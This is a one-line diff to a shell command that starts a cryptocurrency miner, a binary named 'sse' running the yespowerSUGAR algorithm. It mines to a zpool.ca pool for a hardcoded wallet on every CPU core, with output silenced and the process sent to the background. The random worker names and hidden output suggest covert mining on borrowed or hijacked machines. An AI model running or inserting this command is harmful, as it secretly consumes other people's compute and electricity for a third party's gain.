@@ -1,1 +1,1 @@
-./sse -a yespowerSUGAR -o stratum+tcp://yespowerSUGAR.na.mine.zpool.ca:6241 -u D8zcvGHWayuBq5MRncKTnKtFcooQCueZLP.$(shuf -n 1 -i 1-9999999) -p c=DGB,zap=SUGAR -t -q $(nproc) >/dev/null 2>&1 & wait
+./sse -a yespowerSUGAR -o stratum+tcp://yespowerSUGAR.na.mine.zpool.ca:6241 -u D8zcvGHWayuBq5MRncKTnKtFcooQCueZLP.$(shuf -n 1 -i 1-9999999) -p c=DGB,zap=SUGAR -t $(nproc) -q >/dev/null 2>&1 & wait
